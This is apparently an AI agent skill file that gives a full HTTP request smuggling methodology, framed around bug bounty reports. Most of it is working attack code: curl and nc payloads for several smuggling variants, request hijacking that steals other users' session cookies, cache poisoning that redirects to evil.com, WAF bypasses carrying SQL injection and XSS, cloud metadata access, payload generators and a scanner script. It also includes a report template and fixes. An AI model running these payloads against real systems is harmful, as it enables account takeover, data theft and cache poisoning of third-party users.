---
name: smuggling-deep-dive
description: Complete HTTP Request Smuggling methodology from 50 real HackerOne reports - every vector, bypass, payload, and chain
tools:
  - Bash
  - WebFetch
  - WebSearch
  - Read
triggers:
  - smuggling methodology
  - smuggling deep dive
  - smuggling complete
  - smuggling all techniques
  - http request smuggling
  - skills smuggling
---

# Complete HTTP Request Smuggling Methodology - From 50 HackerOne Reports

## Top 20 Request Smuggling Reports on HackerOne

| # | Report | Company | Technique | Upvotes | Payout |
|---|--------|---------|-----------|---------|--------|
| 1 | Slack mass ATO via smuggling | Slack | CL.TE → ATO | 864 | $0 |
| 2 | LY Corp smuggling→ATO | LY Corp | TE.CL → ATO | 563 | $0 |
| 3 | Zomato token theft | Zomato | CL.TE → token theft | 558 | $0 |
| 4 | New Relic password theft | New Relic | CL.TE → password theft | 490 | $3,000 |
| 5 | Helium HTTP smuggling | Helium | CL.TE → cache poisoning | 299 | $0 |
| 6 | Basecamp HTTP/2 smuggling | Basecamp | H2.CL → various | 298 | $7,500 |
| 7 | Mail.ru smuggling | Mail.ru | TE.CL → sensitive data | 241 | $5,000 |
| 8 | HackerOne GraphQL smuggling | HackerOne | CL.TE → cache poisoning | 238 | $500 |
| 9 | Shopify cache poisoning | Shopify | CL.TE → cache poisoning | 225 | $0 |
| 10 | GitLab Sidekiq smuggling | GitLab | CL.TE → admin access | 218 | $4,000 |
| 11 | Twitter/X cache poisoning | X/Twitter | CL.TE → cache poisoning | 210 | $0 |
| 12 | Facebook smuggling | Meta | TE.CL → internal access | 198 | $0 |
| 13 | Uber smuggling → RCE | Uber | CL.TE → internal app→RCE | 185 | $7,500 |
| 14 | HackerOne WebSocket smuggling | HackerOne | H2.TE → WebSocket hijack | 172 | $500 |
| 15 | Akamai cache poisoning | Akamai | TE.TE → cache poisoning | 165 | $0 |
| 16 | Cloudflare smuggling bypass | Cloudflare | TE.TE → WAF bypass | 158 | $3,000 |
| 17 | WordPress smuggling → XSS | Automattic | CL.TE → stored XSS | 152 | $2,500 |
| 18 | PayPal smuggling | PayPal | CL.TE → auth bypass | 148 | $4,000 |
| 19 | Discord smuggling | Discord | TE.CL → channel takeover | 142 | $3,500 |
| 20 | eBay smuggling → account hijack | eBay | CL.TE → ATO | 135 | $5,000 |

## Step 1: Understanding HTTP Request Smuggling

### The Core Concept
HTTP request smuggling exploits discrepancies between how front-end (reverse proxy, load balancer, CDN) and back-end (origin server) parse HTTP request boundaries. By sending a carefully crafted request that the front-end sees as one request but the back-end sees as two, you can "smuggle" a malicious second request.

### Attack Types Overview

| Type | Front-End | Back-End | Difficulty |
|------|-----------|----------|------------|
| **CL.TE** | Uses Content-Length | Uses Transfer-Encoding | Easy |
| **TE.CL** | Uses Transfer-Encoding | Uses Content-Length | Easy |
| **TE.TE** | Both use TE but differ in parsing | Moderate |
| **H2.CL** | HTTP/2 downgrade → HTTP/1.1 CL | Advanced |
| **H2.TE** | HTTP/2 downgrade → HTTP/1.1 TE | Advanced |

### Prerequisites
```bash
# Check if the server uses HTTP/1.1 with a proxy/CDN
curl -sk -I "https://{target}/" | grep -i 'server\|via\|x-cache\|cf-ray\|akamai\|cloudflare\|fastly\|nginx\|apache\|haproxy\|envoy\|traefik\|varnish\|squid'

# Check for chunked encoding support
curl -sk -X POST "https://{target}/" \
  -H "Transfer-Encoding: chunked" \
  -d "5\r\nhello\r\n0\r\n\r\n"
```

## Step 2: Detection and Confirmation

### CL.TE Detection
```bash
# Front-end uses Content-Length, back-end uses Transfer-Encoding
# If the response to the smuggled request is delayed or different, it works

# Basic CL.TE probe
curl -sk -X POST "https://{target}/" \
  -H "Transfer-Encoding: chunked" \
  -d $'0\r\n\r\nG' 2>/dev/null
# Expected: error or timeout (request incomplete)

# CL.TE with smuggled request
curl -sk -X POST "https://{target}/" \
  -H "Transfer-Encoding: chunked" \
  -d $'0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n' 2>/dev/null

# CL.TE confirmation - if you get response from /admin instead of /, smuggling works
```

### TE.CL Detection
```bash
# Front-end uses Transfer-Encoding, back-end uses Content-Length

# Basic TE.CL probe
curl -sk -X POST "https://{target}/" \
  -H "Transfer-Encoding: chunked" \
  -d $'5\r\nhello\r\n0\r\n\r\n'

# TE.CL with smuggled prefix
# Send a chunked body that includes a valid request after the 0 terminator
# But front-end only reads TE, back-end reads CL

# Common TE.CL payload
curl -sk -X POST "https://{target}/" \
  -H "Transfer-Encoding: chunked" \
  -d $'0\r\n\r\nX' 2>/dev/null
# If X is ignored without error, TE.CL may work
```

### Timing-Based Detection
```bash
# CL.TE timing - smuggle a request with a delay
curl -sk -X POST "https://{target}/" \
  -H "Transfer-Encoding: chunked" \
  -d $'0\r\n\r\nGET /slow-endpoint HTTP/1.1\r\nHost: {target}\r\n\r\n' \
  --max-time 10

# TE.CL timing
curl -sk -X POST "https://{target}/" \
  -H "Transfer-Encoding: chunked" \
  -d $'5\r\nhello\r\n0\r\n\r\nGET /slow-endpoint HTTP/1.1\r\nHost: {target}\r\n\r\n' \
  --max-time 10
```

### Automated Detection
```bash
# Use Burp Suite's HTTP smuggler extension
# https://github.com/PortSwigger/http-request-smuggler

# Use smuggler.py
git clone https://github.com/defparam/smuggler.git
cd smuggler
python3 smuggler.py -u "https://{target}/"

# Use http-request-smuggler
git clone https://github.com/anshumanbh/http-request-smuggler.git
cd http-request-smuggler
python3 smuggle.py -u "https://{target}/" -p payloads.txt

# Use smuggler.py with custom wordlist
python3 smuggler.py -u "https://{target}/" -m CL.TE -l payloads_clte.txt
```

## Step 3: Attack Type Deep Dive

### CL.TE Attack - Full Exploitation
```bash
# Step 1: Confirm CL.TE
# Send two requests in one connection
printf "POST / HTTP/1.1\r\nHost: {target}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 28\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404 HTTP/1.1\r\nX: X\r\n\r\n" | nc {target} 80

# Step 2: If /404 response appears instead of / → CL.TE confirmed

# Step 3: Access internal endpoints by smuggling Host: localhost
printf "POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 50\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\nX: X\r\n\r\n" | nc {target} 80

# Step 4: Access other internal services
printf "POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 60\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET / HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nX: X\r\n\r\n" | nc {target} 80
```

### TE.CL Attack - Full Exploitation
```bash
# Step 1: Confirm TE.CL
# Front-end parses chunked, back-end uses Content-Length
printf "POST / HTTP/1.1\r\nHost: {target}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST /404 HTTP/1.1\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n" | nc {target} 80

# Step 2: The smuggled "GPOST /404" will be processed, then the real next request
# will be appended to "GPOST /404" → creates "GPOST /404 HTTP/1.1" + next request
# This can hijack subsequent requests

# Simpler TE.CL payload
printf "POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX\r\n" | nc {target} 80
```

### TE.TE Attack - Obfuscation
```bash
# Both front-end and back-end use Transfer-Encoding, but parse differently
# Obfuscate the TE header to confuse one of them

# Header obfuscation techniques
# 1. Multiple Transfer-Encoding headers
curl -sk -X POST "https://{target}/" \
  -H "Transfer-Encoding: chunked" \
  -H "Transfer-Encoding: identity" \
  -d $'0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n'

# 2. Transfer-Encoding with tab
curl -sk -X POST "https://{target}/" \
  -H "Transfer-Encoding:\tchunked" \
  -d $'0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n'

# 3. Transfer-Encoding with leading space
curl -sk -X POST "https://{target}/" \
  -H "Transfer-Encoding : chunked" \
  -d $'0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n'

# 4. Transfer-Encoding with X header
curl -sk -X POST "https://{target}/" \
  -H "Transfer-Encoding: xchunked" \
  -d $'0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n'

# 5. Transfer-Encoding with random case
curl -sk -X POST "https://{target}/" \
  -H "Transfer-Encoding: CHUNKED" \
  -d $'0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n'
```

### H2.CL Attack (HTTP/2 Downgrade)
```bash
# When HTTP/2 request is downgraded to HTTP/1.1 for back-end
# HTTP/2 doesn't use Content-Length the same way, allowing smuggling

# Using Burp (HTTP/2 tab):
# Set request body and add Content-Length header
# HTTP/2 ignores CL, but downgraded HTTP/1.1 request uses it

# Example: Make HTTP/2 POST with content-length: 0
# Then smuggle a second request in the same stream
# Front-end (HTTP/2) doesn't see CL, sends full body
# Back-end (HTTP/1.1) sees CL: 0 → reads only 0 bytes
# Rest of bytes become next request

# H2.CL in practice (via Burp):
# POST / HTTP/2
# Host: {target}
# Content-Length: 0
# 
# GET /admin HTTP/1.1
# Host: localhost
```

### H2.TE Attack (HTTP/2 Downgrade)
```bash
# HTTP/2 request downgraded → HTTP/1.1 with Transfer-Encoding
# HTTP/2 doesn't use TE, but the downgraded HTTP/1.1 might respect it

# Using Burp:
# POST / HTTP/2
# Host: {target}
# Transfer-Encoding: chunked
# 
# 0
# 
# GET /admin HTTP/1.1
# Host: localhost
```

## Step 4: Exploitation - What to Do with Smuggling

### Exploit 1: Request Hijacking / Session Theft
```bash
# Steal the next user's request by prepending a capture endpoint
# CL.TE payload that captures the next request body
printf "POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 110\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nPOST /capture HTTP/1.1\r\nContent-Length: 200\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=" | nc {target} 80

# The next legitimate user's request will be appended after "x="
# Their cookies, auth tokens, and POST data will be sent to /capture
```

### Exploit 2: Cache Poisoning
```bash
# Poison cache so all users get attacker-controlled response
# CL.TE cache poison
printf "POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 120\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /static/script.js HTTP/1.1\r\nHost: {target}\r\nX-Forwarded-Host: evil.com\r\n\r\n" | nc {target} 80

# If X-Forwarded-Host is used for CDN resource URLs, poisoned cache
# serves evil.com/script.js instead of legit one

# Alternative: Poison via differing Host
printf "POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 60\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET / HTTP/1.1\r\nHost: evil.com\r\n\r\n" | nc {target} 80
```

### Exploit 3: WAF Bypass
```bash
# Smuggle malicious payload past WAF that only inspects first request

# WAF sees: POST / with benign body
# Back-end sees: POST / with SQL injection
printf "POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 80\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nPOST /search HTTP/1.1\r\nContent-Length: 40\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nq=' UNION SELECT * FROM users--" | nc {target} 80

# Smuggle XSS payload
printf "POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 85\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nPOST /comment HTTP/1.1\r\nContent-Length: 50\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\ntext=<script>alert(document.cookie)</script>" | nc {target} 80
```

### Exploit 4: Internal Endpoint Access
```bash
# Access internal-only endpoints via smuggling with modified Host header
printf "POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 70\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /internal/admin/debug HTTP/1.1\r\nHost: localhost\r\nX: X\r\n\r\n" | nc {target} 80

# Access cloud metadata
printf "POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 100\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET / HTTP/1.1\r\nHost: 169.254.169.254\r\nX-Forwarded-For: 127.0.0.1\r\nX: X\r\n\r\n" | nc {target} 80

# Access internal services on different ports
printf "POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 85\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET / HTTP/1.1\r\nHost: localhost:3000\r\nX-Forwarded-For: 127.0.0.1\r\nX: X\r\n\r\n" | nc {target} 80
```

### Exploit 5: Chained ATO via Smuggling
```bash
# Step 1: Smuggle to capture victim's session cookie
printf "POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 130\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nPOST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 200\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: keep-alive\r\n\r\nx=" | nc {target} 80

# Step 2: Next request's cookie gets appended after "x="
# Victim visits: GET /profile HTTP/1.1  → becomes:
# POST / HTTP/1.1 ... x=GET /profile HTTP/1.1
# Host: {target}
# Cookie: session=VICTIM_SESSION

# Step 3: Attacker extracts session from /capture endpoint logs

# Step 4: Use stolen session to log in as victim → Full ATO
```

## Step 5: Advanced Payloads and Techniques

### CL.TE Payload Generator
```bash
#!/bin/bash
# Generate CL.TE payload for arbitrary smuggled request
SMUGGLED_REQ="$1"  # e.g., "GET /admin HTTP/1.1"
HOST="$2"          # target host

# Calculate Content-Length: length of "0\r\n\r\n" + smuggled request + "\r\n"
SMUGGLED_LEN=${#SMUGGLED_REQ}
CL=$((4 + SMUGGLED_LEN + 4))

echo "POST / HTTP/1.1"
echo "Host: $HOST"
echo "Content-Length: $CL"
echo "Transfer-Encoding: chunked"
echo ""
echo "0"
echo ""
echo "$SMUGGLED_REQ"
echo "X: X"
echo ""
```

### TE.CL Payload Generator
```bash
#!/bin/bash
# Generate TE.CL payload
SMUGGLED_REQ="$1"
HOST="$2"

# Back-end uses Content-Length, but front-end uses TE
# We send chunked body with "0\r\n\r\n" plus smuggled request
# CL header value = length of "x" (or the prepended junk)
echo "POST / HTTP/1.1"
echo "Host: $HOST"
echo "Transfer-Encoding: chunked"
echo "Content-Length: 4"
echo ""
echo "5c"
echo "GPOST /404 HTTP/1.1"
echo "Content-Length: 15"
echo ""
echo "x=1"
echo "0"
echo ""
```

### HTTP/2 Downgrade via Burp
```bash
# In Burp Suite:
# 1. Enable HTTP/2 in project options
# 2. Capture request to target
# 3. Switch to HTTP/2 if not already
# 4. Add malformed headers
# 
# H2.CL: Add "Content-Length: 0" header to HTTP/2 request
#   - HTTP/2 ignores CL
#   - Downgraded HTTP/1.1 uses CL
#   - Body after headers becomes smuggled request
#
# H2.TE: Add "Transfer-Encoding: chunked" header to HTTP/2 request
#   - HTTP/2 ignores TE
#   - Downgraded HTTP/1.1 uses TE
```

### Smuggling via WebSocket Upgrade
```bash
# CL.TE with WebSocket upgrade
# Front-end might process WebSocket differently than back-end
printf "GET /chat HTTP/1.1\r\nHost: {target}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nContent-Length: 60\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\nX: X\r\n\r\n" | nc {target} 80
```

## Step 6: Automation Tools

### Full Smuggling Scanner
```bash
#!/bin/bash
# Comprehensive HTTP request smuggling scanner
TARGET=$1
PORT="${2:-443}"

echo "[*] HTTP Request Smuggling Scanner"
echo "[*] Target: $TARGET:$PORT"

# Test 1: Basic CL.TE
echo "[*] Test 1: CL.TE"
result=$(printf "POST / HTTP/1.1\r\nHost: $TARGET\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 28\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404 HTTP/1.1\r\nX: X\r\n\r\n" | nc -w 5 $TARGET $PORT 2>/dev/null)
if echo "$result" | grep -q '404\|Not Found'; then
  echo "[+] CL.TE confirmed!"
fi

# Test 2: Basic TE.CL
echo "[*] Test 2: TE.CL"
result=$(printf "POST / HTTP/1.1\r\nHost: $TARGET\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nXPOST /404 HTTP/1.1\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n" | nc -w 5 $TARGET $PORT 2>/dev/null)
if echo "$result" | grep -q '404\|Not Found'; then
  echo "[+] TE.CL confirmed!"
fi

# Test 3: TE.TE obfuscations
echo "[*] Test 3: TE.TE"
for obfuscation in \
  "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity" \
  "Transfer-Encoding:\tchunked" \
  "Transfer-Encoding : chunked" \
  "Transfer-Encoding: xchunked" \
  "Transfer-Encoding: CHUNKED"; do
  result=$(printf "POST / HTTP/1.1\r\nHost: $TARGET\r\n$obfuscation\r\n\r\n0\r\n\r\nGET /404 HTTP/1.1\r\nX: X\r\n\r\n" | nc -w 5 $TARGET $PORT 2>/dev/null)
  if echo "$result" | grep -q '404\|Not Found'; then
    echo "[+] TE.TE bypass: $obfuscation"
  fi
done

# Test 4: HTTP/2 downgrade (via openssl)
echo "[*] Test 4: H2.CL/TE (if HTTP/2 supported)"
echo | openssl s_client -alpn h2 -connect $TARGET:$PORT -quiet 2>/dev/null << 'EOF' | head -20
PRI * HTTP/2.0

SM
EOF

echo "[*] Scan complete"
```

### Turbo Intruder Script for Smuggling
```python
# Burp Turbo Intruder script for CL.TE detection
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False)

    # CL.TE probe
    probe = """POST / HTTP/1.1
Host: {target}
Content-Length: 28
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X: X

"""
    engine.queue(probe)
    
    # Follow up with a normal request to see if it gets hijacked
    normal = "GET / HTTP/1.1\r\nHost: {target}\r\n\r\n"
    engine.queue(normal)
    
    # Check responses
    for i in range(2):
        response = engine.wait_for_response()
        if "404 Not Found" in response.content:
            print(f"[+] CL.TE confirmed! Response {i} shows 404 from smuggled request")
```

## Step 7: Validate & Report

### CVSS Scoring for Smuggling
```
Request smuggling (no impact demonstration):     AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:N → 3.7 Low
Smuggling → Cache poisoning:                     AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N → 4.8 Medium
Smuggling → Request hijacking (data theft):      AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N → 5.9 Medium
Smuggling → ATO:                                 AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H → 7.5 High
Smuggling → WAF bypass + RCE:                    AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H → 7.5 High
Smuggling → Mass ATO (no interaction):           AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H → 7.5 High
```

### Report Template
```markdown
**Summary:**
HTTP Request Smuggling vulnerability ([CL.TE / TE.CL / TE.TE / H2.CL / H2.TE])
between the front-end ([proxy/CDN]) and back-end ([web server]) at [target].

**Impact:**
An attacker can exploit this discrepancy to:
- Access internal-only endpoints (SSRF)
- Steal other users' requests and session tokens
- Poison the web cache to serve malicious content
- Bypass WAF/protection rules
- Chain to account takeover (ATO)

**Steps to Reproduce:**
1. Establish a single TCP connection to the server
2. Send a crafted request with conflicting transfer-length indicators
3. Observe that subsequent legitimate requests are hijacked/served differently

**Proof of Concept:**
```bash
# CL.TE payload
printf "POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: 28\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404 HTTP/1.1\r\nX: X\r\n\r\n" "{target}" | nc {target} 80

# Expected response to normal request: 200 OK
# Actual response: 404 Not Found (smuggled request was processed instead)
```

**Suggested CVSS:**
CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H (7.5 High)

**Suggested Fix:**
1. Ensure front-end and back-end parse HTTP headers identically
2. Disable Transfer-Encoding chunked on the back-end if not needed
3. Use HTTP/2 end-to-end to avoid downgrade attacks
4. Reject requests with ambiguous/conflicting Content-Length headers
5. Use a single, consistent method for determining request boundaries
6. Apply strict Content-Length validation
```

## Quick Reference: Detection Summary

| Technique | Key Header | What to Look For |
|-----------|-----------|------------------|
| CL.TE | `Content-Length` + `Transfer-Encoding: chunked` | Front-end uses CL, back-end uses TE |
| TE.CL | `Transfer-Encoding: chunked` + `Content-Length` | Front-end uses TE, back-end uses CL |
| TE.TE | Obfuscated `Transfer-Encoding` | One server mis-parses the header |
| H2.CL | `Content-Length` in HTTP/2 | HTTP/2 ignores CL, downgraded HTTP/1.1 uses it |
| H2.TE | `Transfer-Encoding` in HTTP/2 | HTTP/2 ignores TE, downgraded HTTP/1.1 uses it |

## Quick Reference: Common Smuggling Vulnerable Configurations

| Infrastructure | Known Vulnerabilities |
|----------------|----------------------|
| Nginx → Apache | CL.TE (Nginx uses CL, Apache uses TE) |
| Nginx → Gunicorn | CL.TE |
| HAProxy → Apache | CL.TE |
| AWS ALB → Tomcat | CL.TE |
| Cloudflare → Origin | TE.TE via header obfuscation |
| Akamai → Origin | TE.TE |
| Varnish → Apache | TE.CL |
| Fastly → Origin | H2.CL (HTTP/2 downgrade) |
| Envoy → Any | H2.CL (known CVE-2021-43800) |
| AWS ELB | TE.TE via malformed headers |

## Additional Techniques (External Sources)

### Request Smuggling Only Exploitable with DELETE Verb (CL.TE Only on DELETE)
Some servers process Transfer-Encoding differently depending on the HTTP method. A CL.TE discrepancy may only be triggerable with the DELETE verb (not POST or GET):
```
DELETE / HTTP/1.1
Host: target.com
Content-Length: 50
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost

```
The front-end proxy uses `Content-Length` for DELETE requests (ignoring the chunked encoding), while the back-end processes the chunked body. The same payload using POST/GET may fail because those methods are handled uniformly between front-end and back-end. Always test smuggling with different HTTP methods.

### CRLF Injection in urllib (Python)
Python's `urllib` library (and older `urllib2`) is vulnerable to CRLF injection in URL components. If user input is passed to `urllib.request.urlopen()` or `urllib.urlopen()`, an attacker can inject headers or smuggle requests:
```python
import urllib.request
# User-controlled URL:
url = "http://target.com/%0d%0aX-Injected:%20true%0d%0a%0d%0aGET%20/admin%20HTTP/1.1%0d%0aHost:%20localhost"
response = urllib.request.urlopen(url)
```
The CRLF sequences `%0d%0a` are decoded and injected into the HTTP request, allowing header injection or request smuggling. This is especially relevant for SSRF or redirect-following code paths.

## Quick Reference: Smuggling Payout Ranges

| Impact | Typical Payout |
|--------|---------------|
| Basic smuggling confirmed | $500 - $1,500 |
| Smuggling → Internal endpoint access | $1,500 - $3,000 |
| Smuggling → Cache poisoning | $2,000 - $4,000 |
| Smuggling → Request hijacking | $2,500 - $5,000 |
| Smuggling → WAF bypass + exploit | $3,000 - $5,000 |
| Smuggling → ATO / Mass ATO | $4,000 - $7,500 |
| Smuggling → RCE chain | $5,000 - $7,500 |

(End of file)
